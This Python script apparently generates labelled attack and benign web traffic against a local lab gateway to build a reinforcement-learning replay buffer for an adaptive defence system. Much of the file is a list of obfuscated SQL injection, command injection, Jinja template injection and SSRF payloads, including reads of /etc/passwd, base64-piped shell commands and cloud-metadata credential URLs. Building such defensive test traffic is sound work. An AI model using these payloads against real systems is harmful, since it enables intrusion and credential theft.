from __future__ import annotations

import argparse
import json
import random
import sys
import time
import urllib.error
import urllib.request
from collections import Counter
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Iterable, Optional

CONTROL_PLANE_DIR = Path(__file__).resolve().parents[1]
REPLAY_BUFFER_DIR = CONTROL_PLANE_DIR / "replay_buffer"
RL_AGENT_DIR = CONTROL_PLANE_DIR / "rl_agent"
SYSTEM_DIR = CONTROL_PLANE_DIR.parent

for path in (CONTROL_PLANE_DIR, REPLAY_BUFFER_DIR, RL_AGENT_DIR):
    if str(path) not in sys.path:
        sys.path.insert(0, str(path))

from export_replay_buffer import (  # noqa: E402
    build_transitions,
    collect_decisions,
    group_outcome_events,
    load_jsonl,
    write_jsonl,
)


ATTACK_WEIGHTS = {
    "benign": 0.20,
    "sqli": 0.22,
    "cmdi": 0.20,
    "ssti": 0.20,
    "ssrf": 0.18,
}


@dataclass(frozen=True)
class TrafficCase:
    kind: str
    method: str
    path: str
    body: dict[str, Any]
    expected_backend: Optional[str]


CASES = {
    "sqli": TrafficCase(
        kind="sqli",
        method="POST",
        path="/api/articles/search",
        body={"query": "union select password from users"},
        expected_backend="sqli_api",
    ),
    "cmdi": TrafficCase(
        kind="cmdi",
        method="POST",
        path="/api/tools/ping",
        body={"host": "8.8.8.8; id"},
        expected_backend="cmdi_api",
    ),
    "ssti": TrafficCase(
        kind="ssti",
        method="POST",
        path="/api/tools/preview",
        body={
            "content": (
                "# Replay Buffer\n\n"
                "Type some **Markdown** here.\n\n"
                "```python\nprint(\"hello\")\n```\n\n"
                "{{7*7}}"
            )
        },
        expected_backend="ssti_api",
    ),
    "ssrf": TrafficCase(
        kind="ssrf",
        method="POST",
        path="/api/tools/fetch",
        body={"url": "http://169.254.169.254/latest/meta-data/"},
        expected_backend="ssrf_api",
    ),
}


ATTACK_VARIANTS: dict[str, list[dict[str, Any]]] = {
    "sqli": [
        {
            "name": "comment_split_union",
            "tags": ["comment_split", "case_mixing", "union"],
            "body": {"query": "uNiOn/**/SeLeCt/**/password/**/FrOm/**/users--"},
        },
        {
            "name": "boolean_or_comment",
            "tags": ["comment_split", "boolean"],
            "body": {"query": "' OR/**/1=1--"},
        },
        {
            "name": "extractvalue_error",
            "tags": ["error_based", "function_call"],
            "body": {"query": "admin' AND extractvalue(1,concat(0x7e,(select database())))--"},
        },
        {
            "name": "url_encoded_union",
            "tags": ["url_encoded", "union"],
            "body": {"query": "%27%20UNION%20SELECT%20NULL,password%20FROM%20users--"},
        },
        {
            "name": "mssql_time_delay",
            "tags": ["time_based", "stacked_query"],
            "body": {"query": "1';WAITFOR DELAY '0:0:2'--"},
        },
        {
            "name": "stacked_drop",
            "tags": ["stacked_query", "destructive_keyword"],
            "body": {"query": "Robert'); DROP TABLE audit_log;--"},
        },
        {
            "name": "mysql_versioned_comment_union",
            "tags": ["versioned_comment", "union"],
            "body": {"query": "/*!50000UNION*/ /*!50000SELECT*/ username,password FROM users--"},
        },
        {
            "name": "double_url_encoded_boolean",
            "tags": ["double_url_encoded", "boolean"],
            "body": {"query": "%2527%2520OR%25201%253D1%2523"},
        },
        {
            "name": "hex_string_comparison",
            "tags": ["hex_literal", "boolean"],
            "body": {"query": "admin' AND 0x61646d696e=hex('admin')--"},
        },
        {
            "name": "concat_char_union",
            "tags": ["function_call", "union"],
            "body": {"query": "' UNION SELECT concat(char(117),char(115),char(101),char(114)),password FROM users--"},
        },
        {
            "name": "space_as_inline_comment",
            "tags": ["comment_split", "union"],
            "body": {"query": "UN/**/ION SE/**/LECT password FR/**/OM users"},
        },
        {
            "name": "tab_newline_spacing",
            "tags": ["whitespace_obfuscation", "union"],
            "body": {"query": "'\tUNION\nSELECT\npassword\nFROM\nusers--"},
        },
        {
            "name": "or_sleep_function",
            "tags": ["time_based", "function_call"],
            "body": {"query": "' OR IF(1=1,SLEEP(2),0)--"},
        },
        {
            "name": "inline_case_boolean",
            "tags": ["case_mixing", "boolean"],
            "body": {"query": "aDmIn' oR 'x'='x'--"},
        },
        {
            "name": "postgres_cast_probe",
            "tags": ["error_based", "type_cast"],
            "body": {"query": "' AND CAST((SELECT current_database()) AS int)--"},
        },
        {
            "name": "order_by_probe",
            "tags": ["schema_probe", "comment_split"],
            "body": {"query": "'/**/ORDER/**/BY/**/8--"},
        },
    ],
    "cmdi": [
        {
            "name": "and_id",
            "tags": ["operator_chain"],
            "body": {"host": "8.8.8.8&&id"},
        },
        {
            "name": "pipe_whoami",
            "tags": ["pipe"],
            "body": {"host": "127.0.0.1|whoami"},
        },
        {
            "name": "subshell_id",
            "tags": ["subshell"],
            "body": {"host": "localhost$(id)"},
        },
        {
            "name": "url_encoded_semicolon",
            "tags": ["url_encoded", "separator"],
            "body": {"host": "8.8.8.8%3Bid"},
        },
        {
            "name": "backtick_uname",
            "tags": ["backtick"],
            "body": {"host": "example.com`uname -a`"},
        },
        {
            "name": "newline_separator",
            "tags": ["newline", "separator"],
            "body": {"host": "1.1.1.1\nid"},
        },
        {
            "name": "ifs_separator",
            "tags": ["shell_variable", "separator"],
            "body": {"host": "8.8.8.8;${IFS}id"},
        },
        {
            "name": "or_operator_uname",
            "tags": ["operator_chain"],
            "body": {"host": "127.0.0.1||uname -a"},
        },
        {
            "name": "single_amp_whoami",
            "tags": ["operator_chain"],
            "body": {"host": "localhost & whoami"},
        },
        {
            "name": "url_encoded_pipe",
            "tags": ["url_encoded", "pipe"],
            "body": {"host": "localhost%7Ccat%20/etc/passwd"},
        },
        {
            "name": "backslash_space",
            "tags": ["whitespace_obfuscation"],
            "body": {"host": "8.8.8.8;cat\\ /etc/passwd"},
        },
        {
            "name": "tab_separator",
            "tags": ["whitespace_obfuscation", "separator"],
            "body": {"host": "8.8.8.8;\tid"},
        },
        {
            "name": "printf_subshell",
            "tags": ["subshell", "function_call"],
            "body": {"host": "localhost$(printf id)"},
        },
        {
            "name": "env_path_sh",
            "tags": ["shell_variable", "path_obfuscation"],
            "body": {"host": "127.0.0.1;${PATH:0:1}bin${PATH:0:1}sh -c id"},
        },
        {
            "name": "brace_expansion",
            "tags": ["brace_expansion"],
            "body": {"host": "localhost;{id,-u}"},
        },
        {
            "name": "base64_pipeline",
            "tags": ["pipe", "encoding"],
            "body": {"host": "8.8.8.8;echo aWQ=|base64 -d|sh"},
        },
    ],
    "ssti": [
        {
            "name": "basic_expression_markdown",
            "tags": ["jinja_expression", "markdown_context"],
            "body": {"content": "# Notes\n\n{{7*7}}\n\nNormal **markdown** around the expression."},
        },
        {
            "name": "spaced_expression_code_block",
            "tags": ["jinja_expression", "whitespace_obfuscation", "markdown_context"],
            "body": {"content": "# Invoice\n\nSubtotal: {{ 6 * 7 }}\n\n```jinja2\n{{config}}\n```"},
        },
        {
            "name": "loop_expression",
            "tags": ["jinja_statement"],
            "body": {"content": "{% for x in [7] %}{{x*x}}{% endfor %}\n\nKeep rendering markdown."},
        },
        {
            "name": "mro_probe",
            "tags": ["object_introspection"],
            "body": {"content": "# Debug\n\n{{ ''.__class__.__mro__[1].__subclasses__()[:2] }}"},
        },
        {
            "name": "mixed_delimiters",
            "tags": ["delimiter_noise", "markdown_context"],
            "body": {"content": "# Mixed\n\nType some **Markdown** here.\n\n${{7*7}}\n\n{{7*7}}"},
        },
        {
            "name": "set_then_render",
            "tags": ["jinja_statement", "markdown_context"],
            "body": {"content": "# Total\n\n{% set subtotal = 7 %}{{ subtotal * 7 }}\n\n- item A\n- item B"},
        },
        {
            "name": "url_encoded_braces",
            "tags": ["url_encoded", "jinja_expression"],
            "body": {"content": "# Encoded\n\n%7B%7B7*7%7D%7D"},
        },
        {
            "name": "fullwidth_brace_noise",
            "tags": ["unicode_noise", "delimiter_noise"],
            "body": {"content": "# Unicode\n\n｛｛7*7｝｝\n\n{{7*7}}"},
        },
        {
            "name": "config_object_probe",
            "tags": ["object_introspection"],
            "body": {"content": "# Config\n\n{{config.items()}}\n\nKeep **markdown** visible."},
        },
        {
            "name": "globals_os_popen",
            "tags": ["object_introspection", "command_probe"],
            "body": {"content": "# Render check\n\n{{ lipsum.__globals__.os.popen('id').read() }}"},
        },
        {
            "name": "cycler_globals_probe",
            "tags": ["object_introspection"],
            "body": {"content": "# Template\n\n{{cycler.__init__.__globals__.os.popen('id').read()}}"},
        },
        {
            "name": "joiner_globals_probe",
            "tags": ["object_introspection"],
            "body": {"content": "# Template\n\n{{joiner.__init__.__globals__.os.popen('whoami').read()}}"},
        },
        {
            "name": "print_statement",
            "tags": ["jinja_statement"],
            "body": {"content": "# Print\n\n{% print(7*7) %}"},
        },
        {
            "name": "filter_obfuscation",
            "tags": ["filter_usage"],
            "body": {"content": "# Filter\n\n{{ ('7*7')|string }}\n\n{{7*7}}"},
        },
        {
            "name": "attribute_concat_probe",
            "tags": ["object_introspection", "string_concat"],
            "body": {"content": "# Attr\n\n{{''|attr('__class__')|attr('__mro__')}}"},
        },
        {
            "name": "markdown_heavy_expression",
            "tags": ["markdown_context", "jinja_expression"],
            "body": {
                "content": (
                    "# Hello\n\n"
                    "Type some **Markdown** here.\n\n"
                    "```python\nprint(\"hello\")\n```\n\n"
                    "> quote\n\n"
                    "{{7*7}}"
                )
            },
        },
    ],
    "ssrf": [
        {
            "name": "aws_metadata_credentials",
            "tags": ["cloud_metadata"],
            "body": {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
        },
        {
            "name": "ipv6_mapped_metadata",
            "tags": ["ipv6_mapped", "cloud_metadata"],
            "body": {"url": "http://[::ffff:169.254.169.254]/latest/meta-data/"},
        },
        {
            "name": "octal_loopback",
            "tags": ["numeric_ip", "loopback"],
            "body": {"url": "http://0177.0.0.1/admin"},
        },
        {
            "name": "localhost_internal",
            "tags": ["localhost", "internal_service"],
            "body": {"url": "http://localhost:5000/internal/status"},
        },
        {
            "name": "integer_loopback",
            "tags": ["numeric_ip", "loopback"],
            "body": {"url": "http://2130706433/latest/meta-data/"},
        },
        {
            "name": "gcp_metadata_host",
            "tags": ["cloud_metadata", "dns_alias"],
            "body": {"url": "http://metadata.google.internal/computeMetadata/v1/"},
        },
        {
            "name": "hex_loopback",
            "tags": ["numeric_ip", "loopback"],
            "body": {"url": "http://0x7f000001/admin"},
        },
        {
            "name": "short_loopback",
            "tags": ["numeric_ip", "loopback"],
            "body": {"url": "http://127.1/admin"},
        },
        {
            "name": "mixed_case_scheme_host",
            "tags": ["case_mixing", "cloud_metadata"],
            "body": {"url": "HtTp://169.254.169.254/latest/user-data"},
        },
        {
            "name": "url_encoded_host",
            "tags": ["url_encoded", "cloud_metadata"],
            "body": {"url": "http://169.254.169.254/%6c%61%74%65%73%74/meta-data/"},
        },
        {
            "name": "userinfo_bypass",
            "tags": ["userinfo", "cloud_metadata"],
            "body": {"url": "http://example.com@169.254.169.254/latest/meta-data/"},
        },
        {
            "name": "redirect_hint",
            "tags": ["redirect_probe", "cloud_metadata"],
            "body": {"url": "https://example.com/redirect?next=http://169.254.169.254/latest/meta-data/"},
        },
        {
            "name": "dns_rebind_style",
            "tags": ["dns_alias", "internal_service"],
            "body": {"url": "http://127.0.0.1.nip.io:5000/internal/status"},
        },
        {
            "name": "file_scheme_probe",
            "tags": ["scheme_probe", "local_file"],
            "body": {"url": "file:///etc/passwd"},
        },
        {
            "name": "ftp_scheme_probe",
            "tags": ["scheme_probe"],
            "body": {"url": "ftp://127.0.0.1/private"},
        },
        {
            "name": "azure_metadata_headerless",
            "tags": ["cloud_metadata"],
            "body": {"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"},
        },
    ],
}


BENIGN_REQUESTS = [
    TrafficCase("benign", "GET", "/api/articles?page=1&limit=2", {}, None),
    TrafficCase("benign", "POST", "/api/articles/search", {"query": "tcp"}, None),
    TrafficCase("benign", "POST", "/api/tools/preview", {"content": "# Hello\n\nNormal markdown."}, None),
]


BENIGN_NEAR_MISS_REQUESTS = [
    TrafficCase(
        "benign",
        "POST",
        "/api/articles/search",
        {"query": "SQL injection prevention union select examples"},
        None,
    ),
    TrafficCase(
        "benign",
        "POST",
        "/api/tools/preview",
        {"content": "# Jinja2 notes\n\nUse `{{ user.name }}` in templates, but never render untrusted input."},
        None,
    ),
    TrafficCase("benign", "POST", "/api/tools/ping", {"host": "8.8.8.8"}, None),
    TrafficCase("benign", "POST", "/api/tools/fetch", {"url": "https://example.com"}, None),
]


CROSS_SURFACE_REQUESTS = {
    "sqli": TrafficCase("benign", "POST", "/api/tools/preview", {"content": "# Cross surface"}, None),
    "cmdi": TrafficCase("benign", "POST", "/api/tools/preview", {"content": "# Cross surface"}, None),
    "ssti": TrafficCase("benign", "POST", "/api/tools/ping", {"host": "bad host"}, None),
    "ssrf": TrafficCase("benign", "POST", "/api/tools/preview", {"content": "# Cross surface"}, None),
}


def request_metadata(
    *,
    case: TrafficCase,
    variant_name: str,
    tags: list[str],
    is_obfuscated: bool,
    body: Optional[dict[str, Any]] = None,
) -> dict[str, Any]:
    return {
        "kind": case.kind,
        "method": case.method,
        "path": case.path,
        "expected_backend": case.expected_backend,
        "variant_name": variant_name,
        "tags": tags,
        "is_obfuscated": is_obfuscated,
        "body": body if body is not None else case.body,
    }


def variant_case(kind: str, rng: random.Random, evasion_ratio: float) -> tuple[TrafficCase, dict[str, Any]]:
    base_case = CASES[kind]
    variants = ATTACK_VARIANTS.get(kind) or []
    if not variants or rng.random() > evasion_ratio:
        return base_case, request_metadata(
            case=base_case,
            variant_name="base",
            tags=["base"],
            is_obfuscated=False,
        )
    selected = rng.choice(variants)
    body = dict(selected["body"])
    case = TrafficCase(
        kind=base_case.kind,
        method=base_case.method,
        path=base_case.path,
        body=body,
        expected_backend=base_case.expected_backend,
    )
    return case, request_metadata(
        case=case,
        variant_name=str(selected.get("name") or "unnamed_variant"),
        tags=[str(tag) for tag in selected.get("tags", [])],
        is_obfuscated=True,
        body=body,
    )


def now_run_id() -> str:
    return time.strftime("%Y%m%d%H%M%S", time.gmtime())


def request_json(
    *,
    base_url: str,
    case: TrafficCase,
    session_id: str,
    timeout: float,
) -> tuple[int, str]:
    url = f"{base_url.rstrip('/')}{case.path}"
    headers = {
        "User-Agent": "adaptive-replay-buffer-generator/1.0",
        "Cookie": f"sid={session_id}",
    }
    data: Optional[bytes] = None
    if case.method.upper() != "GET":
        data = json.dumps(case.body).encode("utf-8")
        headers["Content-Type"] = "application/json"

    request = urllib.request.Request(url, data=data, headers=headers, method=case.method.upper())
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            return int(response.status), response.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as exc:
        return int(exc.code), exc.read().decode("utf-8", errors="replace")


def controller_json(controller_url: str, path: str, *, method: str = "GET", timeout: float = 5.0) -> dict[str, Any]:
    request = urllib.request.Request(f"{controller_url.rstrip('/')}{path}", method=method)
    with urllib.request.urlopen(request, timeout=timeout) as response:
        return json.loads(response.read().decode("utf-8"))


def clear_routes(controller_url: str) -> None:
    controller_json(controller_url, "/routes", method="DELETE")


def route_for_session(controller_url: str, session_id: str) -> Optional[str]:
    try:
        body = controller_json(controller_url, f"/route/session/{session_id}")
    except Exception:
        return None
    if not body.get("found"):
        return None
    backend = body.get("backend")
    return str(backend) if backend else None


def wait_for_route(
    *,
    controller_url: str,
    session_id: str,
    expected_backend: str,
    timeout: float,
    interval: float,
) -> bool:
    deadline = time.time() + timeout
    while time.time() < deadline:
        if route_for_session(controller_url, session_id) == expected_backend:
            return True
        time.sleep(interval)
    return False


def validate_preflight_response(kind: str, status: int, body: str) -> bool:
    if kind == "sqli":
        return status == 500 and "SQL syntax" in body
    if kind == "cmdi":
        return status == 200 and "uid=33" in body
    if kind == "ssti":
        return status == 200 and "49" in body and "Markdown" in body
    if kind == "ssrf":
        return status == 200 and "instanceId" in body
    return False


def preflight_adaptive_routes(
    *,
    base_url: str,
    controller_url: str,
    request_timeout: float,
) -> None:
    clear_routes(controller_url)
    for kind, case in CASES.items():
        session_id = f"preflight_{int(time.time())}_{kind}"
        if not case.expected_backend:
            continue
        controller_json(
            controller_url,
            f"/route/session/{session_id}?backend={case.expected_backend}",
            method="POST",
        )
        status, body = request_json(
            base_url=base_url,
            case=case,
            session_id=session_id,
            timeout=request_timeout,
        )
        if not validate_preflight_response(kind, status, body):
            snippet = body.replace("\n", " ")[:160]
            raise RuntimeError(
                f"Preflight failed for {kind}: status={status}, expected_backend={case.expected_backend}, "
                f"body={snippet!r}. Recreate gateway if HAProxy resolved stale container IPs."
            )
    clear_routes(controller_url)


def allocate_kinds(total: int, weights: dict[str, float], rng: random.Random) -> list[str]:
    if total <= 0:
        return []

    raw_counts = {kind: total * weight for kind, weight in weights.items()}
    counts = {kind: int(value) for kind, value in raw_counts.items()}
    remaining = total - sum(counts.values())
    fractional = sorted(
        ((kind, raw_counts[kind] - counts[kind]) for kind in weights),
        key=lambda item: item[1],
        reverse=True,
    )
    for kind, _ in fractional[:remaining]:
        counts[kind] += 1

    kinds: list[str] = []
    for kind, count in counts.items():
        kinds.extend([kind] * count)
    rng.shuffle(kinds)
    return kinds


def parse_traffic_weights(value: Optional[str]) -> dict[str, float]:
    if not value:
        return dict(ATTACK_WEIGHTS)

    weights = dict(ATTACK_WEIGHTS)
    seen: set[str] = set()
    for item in value.split(","):
        item = item.strip()
        if not item:
            continue
        if "=" not in item:
            raise ValueError(f"Invalid --traffic-weights item {item!r}; expected kind=value")
        kind, raw_weight = item.split("=", 1)
        kind = kind.strip().lower()
        if kind not in weights:
            raise ValueError(f"Unknown traffic kind {kind!r}; valid kinds: {sorted(weights)}")
        try:
            weight = float(raw_weight)
        except ValueError as exc:
            raise ValueError(f"Invalid weight for {kind}: {raw_weight!r}") from exc
        if weight < 0:
            raise ValueError(f"Weight for {kind} must be >= 0")
        weights[kind] = weight
        seen.add(kind)

    total = sum(weights.values())
    if total <= 0:
        raise ValueError("At least one traffic weight must be > 0")
    return {kind: weight / total for kind, weight in weights.items()}


def iter_log_files(logs_dir: Path) -> Iterable[Path]:
    if not logs_dir.exists():
        return []
    return sorted(path for path in logs_dir.rglob("*.jsonl") if path.is_file())


def collect_events_for_prefix(*, logs_dir: Path, prefix: str, output_path: Path) -> int:
    output_path.parent.mkdir(parents=True, exist_ok=True)
    written = 0
    with output_path.open("w", encoding="utf-8") as output:
        for path in iter_log_files(logs_dir):
            with path.open("r", encoding="utf-8") as source:
                for line_no, line in enumerate(source, start=1):
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        record = json.loads(line)
                    except json.JSONDecodeError as exc:
                        raise ValueError(f"Invalid JSON at {path}:{line_no}: {exc}") from exc
                    session_id = str(record.get("session_id") or "")
                    if not session_id.startswith(prefix):
                        continue
                    output.write(json.dumps(record, ensure_ascii=True) + "\n")
                    written += 1
    return written


def export_transitions(
    *,
    events_path: Path,
    output_path: Path,
    horizon_seconds: float,
    session_timeout_seconds: float,
    attack_threshold: float,
) -> dict[str, Any]:
    events = load_jsonl(events_path)
    decisions = collect_decisions(events)
    outcomes_by_session = group_outcome_events(events)
    transitions = build_transitions(
        decisions=decisions,
        outcomes_by_session=outcomes_by_session,
        horizon_seconds=horizon_seconds,
        session_timeout_seconds=session_timeout_seconds,
        attack_threshold=attack_threshold,
    )
    written = write_jsonl(output_path, transitions)
    return {
        "events": len(events),
        "decisions": len(decisions),
        "sessions": len({row["session_id"] for row in transitions}),
        "transitions": written,
        "action_counts": dict(Counter(row["action_name"] for row in transitions)),
        "reward_min": min((float(row["reward"]) for row in transitions), default=0.0),
        "reward_max": max((float(row["reward"]) for row in transitions), default=0.0),
    }


def drive_session(
    *,
    base_url: str,
    controller_url: str,
    session_id: str,
    kind: str,
    route_timeout: float,
    route_poll_interval: float,
    request_timeout: float,
    followups: int,
    evasion_ratio: float,
    benign_near_miss_ratio: float,
    rng: random.Random,
) -> dict[str, Any]:
    statuses: list[int] = []
    variants_used: list[dict[str, Any]] = []
    routed = False
    expected_backend: Optional[str] = None

    if kind == "benign":
        requests = list(BENIGN_REQUESTS)
        near_miss_count = 0
        for near_miss in BENIGN_NEAR_MISS_REQUESTS:
            if rng.random() <= benign_near_miss_ratio:
                requests.append(near_miss)
                near_miss_count += 1
        rng.shuffle(requests)
        for case in requests:
            status, _ = request_json(base_url=base_url, case=case, session_id=session_id, timeout=request_timeout)
            statuses.append(status)
            is_near_miss = case in BENIGN_NEAR_MISS_REQUESTS
            variants_used.append(request_metadata(
                case=case,
                variant_name="benign_near_miss" if is_near_miss else "benign_baseline",
                tags=["benign", "near_miss"] if is_near_miss else ["benign"],
                is_obfuscated=False,
            ))
            time.sleep(rng.uniform(0.05, 0.18))
        return {
            "session_id": session_id,
            "kind": kind,
            "expected_backend": None,
            "routed": False,
            "statuses": statuses,
            "benign_near_miss_requests": near_miss_count,
            "variants": variants_used,
        }

    case, metadata = variant_case(kind, rng, evasion_ratio)
    expected_backend = case.expected_backend
    status, _ = request_json(base_url=base_url, case=case, session_id=session_id, timeout=request_timeout)
    statuses.append(status)
    variants_used.append(metadata)

    if expected_backend:
        routed = wait_for_route(
            controller_url=controller_url,
            session_id=session_id,
            expected_backend=expected_backend,
            timeout=route_timeout,
            interval=route_poll_interval,
        )

    for _ in range(max(1, followups)):
        case, metadata = variant_case(kind, rng, evasion_ratio)
        status, _ = request_json(base_url=base_url, case=case, session_id=session_id, timeout=request_timeout)
        statuses.append(status)
        variants_used.append(metadata)
        time.sleep(rng.uniform(0.04, 0.14))

    cross_surface = CROSS_SURFACE_REQUESTS.get(kind)
    if cross_surface:
        status, _ = request_json(
            base_url=base_url,
            case=cross_surface,
            session_id=session_id,
            timeout=request_timeout,
        )
        statuses.append(status)
        variants_used.append(request_metadata(
            case=cross_surface,
            variant_name="cross_surface_continuity_check",
            tags=["benign", "continuity_check"],
            is_obfuscated=False,
        ))

    return {
        "session_id": session_id,
        "kind": kind,
        "expected_backend": expected_backend,
        "routed": routed,
        "statuses": statuses,
        "variants": variants_used,
    }


def parse_args() -> argparse.Namespace:
    run_id = now_run_id()
    default_prefix = f"replay_{run_id}"
    default_output = CONTROL_PLANE_DIR / "rl_agent" / "data" / "replay_buffer.jsonl"

    parser = argparse.ArgumentParser(
        description="Generate Web traffic through the gateway and export host logs into an offline RL replay buffer.",
    )
    parser.add_argument("--gateway-url", default="http://localhost:18080")
    parser.add_argument("--controller-url", default="http://localhost:8001")
    parser.add_argument("--logs-dir", type=Path, default=SYSTEM_DIR / "logs")
    parser.add_argument("--sessions", type=int, default=48)
    parser.add_argument("--prefix", default=default_prefix)
    parser.add_argument(
        "--event-output",
        type=Path,
        default=None,
        help="Collected host events JSONL. Defaults to replay_buffer/data/<prefix>_events.jsonl.",
    )
    parser.add_argument("--output", type=Path, default=default_output)
    parser.add_argument(
        "--manifest-output",
        type=Path,
        default=None,
        help="Write traffic/session/payload metadata. Defaults to replay_buffer/data/<prefix>_traffic_manifest.json.",
    )
    parser.add_argument("--seed", type=int, default=20260524)
    parser.add_argument(
        "--traffic-weights",
        default="",
        help=(
            "Optional comma-separated kind weights, for example "
            "benign=0.35,sqli=0.17,cmdi=0.16,ssti=0.16,ssrf=0.16. "
            "Weights are normalized automatically."
        ),
    )
    parser.add_argument("--route-timeout", type=float, default=35.0)
    parser.add_argument("--route-poll-interval", type=float, default=1.0)
    parser.add_argument("--request-timeout", type=float, default=8.0)
    parser.add_argument("--followups", type=int, default=2)
    parser.add_argument("--evasion-ratio", type=float, default=0.70)
    parser.add_argument("--benign-near-miss-ratio", type=float, default=0.50)
    parser.add_argument("--post-traffic-wait", type=float, default=7.0)
    parser.add_argument("--horizon-seconds", type=float, default=60.0)
    parser.add_argument("--session-timeout-seconds", type=float, default=180.0)
    parser.add_argument("--attack-threshold", type=float, default=0.45)
    parser.add_argument("--no-clear-routes", action="store_true")
    parser.add_argument("--skip-preflight", action="store_true")
    parser.add_argument("--keep-routes", action="store_true")
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    event_output = args.event_output or (
        CONTROL_PLANE_DIR / "replay_buffer" / "data" / f"{args.prefix}_events.jsonl"
    )
    manifest_output = args.manifest_output or (
        CONTROL_PLANE_DIR / "replay_buffer" / "data" / f"{args.prefix}_traffic_manifest.json"
    )
    if args.sessions <= 0:
        raise ValueError("--sessions must be > 0")
    if args.followups < 0:
        raise ValueError("--followups must be >= 0")
    if not 0.0 <= args.evasion_ratio <= 1.0:
        raise ValueError("--evasion-ratio must be between 0 and 1")
    if not 0.0 <= args.benign_near_miss_ratio <= 1.0:
        raise ValueError("--benign-near-miss-ratio must be between 0 and 1")
    if args.no_clear_routes and not args.skip_preflight:
        raise ValueError("--no-clear-routes requires --skip-preflight")

    rng = random.Random(args.seed)
    traffic_weights = parse_traffic_weights(args.traffic_weights)
    kinds = allocate_kinds(args.sessions, traffic_weights, rng)

    if not args.no_clear_routes:
        clear_routes(args.controller_url)
        if not args.skip_preflight:
            preflight_adaptive_routes(
                base_url=args.gateway_url,
                controller_url=args.controller_url,
                request_timeout=args.request_timeout,
            )

    session_results: list[dict[str, Any]] = []
    for idx, kind in enumerate(kinds, start=1):
        session_id = f"{args.prefix}_{idx:04d}_{kind}"
        result = drive_session(
            base_url=args.gateway_url,
            controller_url=args.controller_url,
            session_id=session_id,
            kind=kind,
            route_timeout=args.route_timeout,
            route_poll_interval=args.route_poll_interval,
            request_timeout=args.request_timeout,
            followups=args.followups,
            evasion_ratio=args.evasion_ratio,
            benign_near_miss_ratio=args.benign_near_miss_ratio,
            rng=rng,
        )
        session_results.append(result)
        print(
            f"[{idx:03d}/{args.sessions:03d}] {kind:<6} "
            f"sid={session_id} routed={result['routed']} statuses={result['statuses']}",
            flush=True,
        )

    if args.post_traffic_wait > 0:
        time.sleep(args.post_traffic_wait)

    event_count = collect_events_for_prefix(
        logs_dir=args.logs_dir,
        prefix=args.prefix,
        output_path=event_output,
    )
    export_stats = export_transitions(
        events_path=event_output,
        output_path=args.output,
        horizon_seconds=args.horizon_seconds,
        session_timeout_seconds=args.session_timeout_seconds,
        attack_threshold=args.attack_threshold,
    )

    kind_counts = Counter(result["kind"] for result in session_results)
    routed_counts = Counter(result["kind"] for result in session_results if result["routed"])
    near_miss_requests = sum(
        int(result.get("benign_near_miss_requests", 0))
        for result in session_results
        if result["kind"] == "benign"
    )
    obfuscated_requests = sum(
        1
        for result in session_results
        for variant in result.get("variants", [])
        if variant.get("is_obfuscated")
    )
    variant_tag_counts = Counter(
        tag
        for result in session_results
        for variant in result.get("variants", [])
        for tag in variant.get("tags", [])
    )
    manifest = {
        "generated_at_utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "prefix": args.prefix,
        "config": {
            "sessions": args.sessions,
            "seed": args.seed,
            "traffic_weights": traffic_weights,
            "followups": args.followups,
            "evasion_ratio": args.evasion_ratio,
            "benign_near_miss_ratio": args.benign_near_miss_ratio,
            "route_timeout": args.route_timeout,
            "route_poll_interval": args.route_poll_interval,
            "request_timeout": args.request_timeout,
            "post_traffic_wait": args.post_traffic_wait,
            "horizon_seconds": args.horizon_seconds,
            "session_timeout_seconds": args.session_timeout_seconds,
            "attack_threshold": args.attack_threshold,
        },
        "summary": {
            "kind_counts": dict(kind_counts),
            "routed_attack_sessions": dict(routed_counts),
            "benign_near_miss_requests": near_miss_requests,
            "obfuscated_attack_requests": obfuscated_requests,
            "variant_tag_counts": dict(variant_tag_counts),
            "host_events_collected": event_count,
            "export_stats": export_stats,
        },
        "session_results": session_results,
    }
    manifest_output.parent.mkdir(parents=True, exist_ok=True)
    manifest_output.write_text(json.dumps(manifest, ensure_ascii=True, indent=2), encoding="utf-8")

    print("Replay traffic generation complete", flush=True)
    print(f"- Prefix: {args.prefix}", flush=True)
    print(f"- Session mix: {dict(kind_counts)}", flush=True)
    print(f"- Routed attack sessions: {dict(routed_counts)}", flush=True)
    print(f"- Evasion ratio: {args.evasion_ratio}", flush=True)
    print(f"- Benign near-miss requests: {near_miss_requests}", flush=True)
    print(f"- Obfuscated attack requests: {obfuscated_requests}", flush=True)
    print(f"- Host events collected: {event_count}", flush=True)
    print(f"- Traffic manifest: {manifest_output}", flush=True)
    print(f"- Event JSONL: {event_output}", flush=True)
    print(f"- Replay buffer: {args.output}", flush=True)
    print(f"- Export stats: {export_stats}", flush=True)

    if not args.keep_routes and not args.no_clear_routes:
        clear_routes(args.controller_url)
        print("- Adaptive routes cleared after export", flush=True)

    if export_stats["transitions"] == 0:
        raise RuntimeError("No replay transitions generated; check analyzer logs and route decisions.")


if __name__ == "__main__":
    main()
